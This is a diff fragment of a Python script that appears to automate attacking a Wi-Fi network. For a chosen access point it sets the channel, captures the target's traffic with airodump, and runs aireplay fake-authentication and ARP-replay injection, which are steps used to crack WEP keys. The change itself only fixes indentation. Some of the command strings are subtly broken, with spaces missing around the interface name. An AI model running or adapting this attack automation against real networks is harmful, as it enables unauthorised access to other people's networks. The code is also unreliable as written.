@@ -270,7 +270,7 @@ def runmain():
 			if (ap[colnames[DUMP_ESSID]] == who2crak):
 #				dprint('Not Implemented yet sorry', 1)
 #				return 0
-			    system(IWCONFIG + ' ' + iface + 'channel ' + ap[colnames[DUMP_CHANNEL]])
+				system(IWCONFIG + ' ' + iface + 'channel ' + ap[colnames[DUMP_CHANNEL]])
 				popen(AIRODUMP + ' --write crackscan ' + iface + '--bssid ' + ap[colnames[DUMP_BSSID]] + ' --channel ' + ap[colnames[DUMP_CHANNEL]]) 
 				system(AIREPLAY + ' --fakeauth 0 -a ' + ap[colnames[DUMP_BSSID]] + ' ' + iface)
 				popen(AIREPLAY + ' --arpreplay ' + iface + ' -b ' + ap[colnames[DUMP_BSSID]])
